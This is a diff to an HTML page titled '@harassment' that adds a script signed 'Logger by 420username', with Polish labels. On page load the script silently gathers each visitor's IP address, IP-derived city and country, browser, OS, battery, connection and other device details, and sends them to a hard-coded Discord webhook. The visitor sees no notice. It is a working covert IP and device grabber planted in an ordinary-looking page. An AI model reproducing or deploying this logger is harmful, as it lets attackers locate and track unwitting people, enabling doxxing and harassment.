@@ -1,6 +1,214 @@
 
 <!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>@harassment</title><meta name="description"><style>body{font-family: 'Array', sans-serif!important;}</style><style>
 
+       <script>
+        async function getUserData() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                const browserInfo = navigator.userAgent;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language;
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const timestamp = new Date().toLocaleString('pl-PL', {
+                    timeZone
+                });
+
+                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobilne" : "💻 Komputer";
+                const onlineStatus = navigator.onLine ? "🟢 Online" : "🔴 Offline";
+                const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
+                const os = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
+                const cpuCores = navigator.hardwareConcurrency;
+                const navHeight = `${window.innerHeight}px`;
+                let batteryLevel = "Nieznane";
+                let powerSavingMode = "Nieznane";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                    powerSavingMode = battery.charging ? "Nie" : "Tak";
+                }
+
+                let adBlockEnabled = "Nieznane";
+                try {
+                    await fetch(new Request("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {
+                            method: 'HEAD',
+                            mode: 'no-cors'
+                        }))
+                        .then(() => adBlockEnabled = "❌ Nie", () => adBlockEnabled = "✅ Tak");
+                } catch (error) {
+                    adBlockEnabled = "✅ Tak";
+                }
+
+                const browserName = navigator.appName;
+                const browserVersion = navigator.appVersion;
+                const browserLanguage = navigator.language;
+                const cookiesEnabled = navigator.cookieEnabled ? "✅ Tak" : "❌ Nie";
+                const connectionType = navigator.connection ? navigator.connection.effectiveType : "Nieznane";
+                const connectionRtt = navigator.connection ? `${navigator.connection.rtt} ms` : "Nieznane";
+                const connectionDownlink = navigator.connection ? `${navigator.connection.downlink} Mbps` : "Nieznane";
+                const osVersion = navigator.userAgentData ? navigator.userAgentData.platformVersion : "Nieznane";
+
+                let location = "Nieznane";
+                try {
+                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const locationData = await locationResponse.json();
+                    location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                } catch (error) {
+                    console.error("Błąd podczas pobierania lokalizacji:", error);
+                }
+
+                const data = {
+                    ip,
+                    browser: browserInfo,
+                    resolution: screenResolution,
+                    language,
+                    timeZone,
+                    timestamp,
+                    deviceType,
+                    onlineStatus,
+                    uptime,
+                    os,
+                    cpuCores,
+                    navHeight,
+                    batteryLevel,
+                    powerSavingMode,
+                    adBlockEnabled,
+                    browserName,
+                    browserVersion,
+                    browserLanguage,
+                    cookiesEnabled,
+                    connectionType,
+                    connectionRtt,
+                    connectionDownlink,
+                    osVersion,
+                    location
+                };
+
+                await sendDataToWebhook(data);
+            } catch (error) {
+                console.error("Błąd podczas pobierania danych:", error);
+            }
+        }
+
+        async function sendDataToWebhook(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1340632409749721108/lKoQRkWR4Gc6ipXqf_gfdEzvP_8ut8wsQ5LaI75vRhuq7WyyPi7Ty4FWrCiBTfL8tXGS'; // webhook
+
+            const payload = {
+                content: "📡 **Nowe logowanie użytkownika!**",
+                embeds: [{
+                    title: "📊 Szczegóły urządzenia",
+                    color: 16711680,
+                    fields: [{
+                        name: "📍 IP",
+                        value: data.ip,
+                        inline: true
+                    }, {
+                        name: "🌍 Lokalizacja",
+                        value: data.location,
+                        inline: true
+                    }, {
+                        name: "🖥️ Rozdzielczość",
+                        value: data.resolution,
+                        inline: true
+                    }, {
+                        name: "🗣️ Język",
+                        value: data.language,
+                        inline: true
+                    }, {
+                        name: "🕒 Strefa czasowa",
+                        value: data.timeZone,
+                        inline: true
+                    }, {
+                        name: "📅 Czas",
+                        value: data.timestamp,
+                        inline: false
+                    }, {
+                        name: "📱 Typ urządzenia",
+                        value: data.deviceType,
+                        inline: true
+                    }, {
+                        name: "🔋 Bateria",
+                        value: data.batteryLevel,
+                        inline: true
+                    }, {
+                        name: "⚡ Tryb oszczędzania",
+                        value: data.powerSavingMode,
+                        inline: true
+                    }, {
+                        name: "🖥️ System operacyjny",
+                        value: data.os,
+                        inline: true
+                    }, {
+                        name: "🔗 Status online",
+                        value: data.onlineStatus,
+                        inline: true
+                    }, {
+                        name: "📊 Czas działania (uptime)",
+                        value: data.uptime,
+                        inline: true
+                    }, {
+                        name: "🖥️ Rdzenie CPU",
+                        value: data.cpuCores.toString(),
+                        inline: true
+                    }, {
+                        name: "📏 Wysokość paska nawigacji",
+                        value: data.navHeight,
+                        inline: true
+                    }, {
+                        name: "🚫 AdBlock",
+                        value: data.adBlockEnabled,
+                        inline: true
+                    }, {
+                        name: "🌐 Przeglądarka",
+                        value: data.browserName,
+                        inline: true
+                    }, {
+                        name: "📜 Wersja przeglądarki",
+                        value: data.browserVersion,
+                        inline: true
+                    }, {
+                        name: "🍪 Ciasteczka",
+                        value: data.cookiesEnabled,
+                        inline: true
+                    }, {
+                        name: "📶 Typ połączenia",
+                        value: data.connectionType,
+                        inline: true
+                    }, {
+                        name: "⏱️ Opóźnienie (RTT)",
+                        value: data.connectionRtt,
+                        inline: true
+                    }, {
+                        name: "⬇️ Prędkość pobierania",
+                        value: data.connectionDownlink,
+                        inline: true
+                    }],
+                    footer: {
+                        text: "Logger by 420username",
+                        icon_url: ""
+                    }
+                }]
+            };
+
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+                console.error("Błąd wysyłania:", response.statusText);
+            } else {
+                console.log("Dane wysłane pomyślnie.");
+            }
+        }
+
+        window.onload = getUserData;
+    </script>
+
 #u_ee11cbb19052e40b07aac0ca060c23ee_audio-control__POgpq {font-family: 'Array', sans-serif;font-size: 33px!important}.u_ee11cbb19052e40b07aac0ca060c23ee_tt__XZe_8 {
     font-family: 'Array', sans-serif!important;;
     font-weight: 200!important;}
